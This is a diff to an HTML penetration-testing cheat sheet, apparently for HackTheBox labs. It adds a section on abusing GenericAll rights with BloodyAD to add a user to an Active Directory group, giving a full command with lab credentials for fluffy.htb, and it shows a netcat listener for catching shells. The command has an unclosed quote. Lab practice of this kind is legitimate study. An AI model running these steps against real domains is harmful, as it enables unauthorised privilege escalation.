@@ -88,6 +88,15 @@
                         <pre><code class="language-powershell">nc -lvnp 9999</code></pre>
                     </ul>
                 </div>
+
+                <div class="notion-body">
+                    <h2 id="Sudo & SUID">BloodyAD</h2>
+                    <ul>
+                        <h3>Adding users to groups</h3>
+                        <p>In case you found that you cant spawn a shell using evilwinrm or psexec you can make use of Bloody AD to perform changes inside the domain. In that case having in mind that we have "GenericAll" permision over a group we can add a user to that group</p>
+                        <pre><code class="language-bash">bloodyAD -u 'p.agila@fluffy.htb' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS p.agila</code></pre>
+                    </ul>
+                </div>
         </div>
     </div>
 </body>
